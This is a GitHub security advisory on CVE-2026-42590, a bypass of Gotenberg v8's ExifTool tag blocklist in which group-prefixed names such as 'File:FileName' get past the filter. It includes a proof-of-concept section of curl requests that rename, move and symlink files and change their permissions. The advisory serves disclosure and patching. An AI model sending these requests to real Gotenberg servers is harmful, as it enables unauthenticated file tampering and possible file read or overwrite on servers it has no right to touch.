# [H] Gotenberg's ExifTool group-prefix syntax bypasses dangerous-tag blocklist

## Summary
Severity: High
Advisory: GHSA-7v3r-m9c8-r855
CVE: CVE-2026-42590
CWE: CWE-184
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-7v3r-m9c8-r855
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0

## Details
**Summary**

The ExifTool metadata write blocklist in Gotenberg v8 can be bypassed using ExifTool's group-prefix syntax, enabling arbitrary file rename, move, hardlink, and symlink creation on the server. This is a bypass of the fix for GHSA-qmwh-9m9c-h36m.

**Details**

The blocklist in `pkg/modules/exiftool/exiftool.go` filters four dangerous pseudo-tags (`FileName`, `Directory`, `HardLink`, `SymLink`) using `strings.EqualFold(key, tag)`. However, ExifTool supports group-prefix syntax where `File:FileName` is processed identically to `FileName` -- the prefix is stripped by `SetNewValue` in `Writer.pl` before tag matching.

The `safeKeyPattern` regex (`^[a-zA-Z0-9\-_.:]+$`) allows colons, so prefixed tag names pass validation. Any prefix works: `File:FileName`, `System:Directory`, `a:HardLink`, etc.

Additionally, `FilePermissions`, `FileUserID`, and `FileGroupID` pseudo-tags are not blocked at all and can modify file attributes without any prefix.

**PoC**

```bash
# Rename the converted PDF (bypasses FileName blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:FileName":"pwned.pdf"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Move the file to /tmp (bypasses Directory blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:Directory":"/tmp"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Create a symlink (bypasses SymLink blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:SymLink":"/tmp/symlink-poc"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Change file permissions (not blocked at all)
curl -F "files=@test.pdf" \
  -F 'metadata={"FilePermissions":"rwxrwxrwx"}' \
  http://localhost:3000/forms/pdfengines/metadata/write
```

**Impact**

Pre-auth (no authentication by default). Attacker can rename, move, or create links to files within the Gotenberg container. In deployments with mounted volumes or non-containerized setups, this enables arbitrary file read via symlink chaining and file overwrite via directory manipulation.

This is a direct bypass of the fix for GHSA-qmwh-9m9c-h36m.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-7v3r-m9c8-r855
- https://nvd.nist.gov/vuln/detail/CVE-2026-42590
- https://github.com/advisories/GHSA-qmwh-9m9c-h36m
- https://github.com/gotenberg/gotenberg
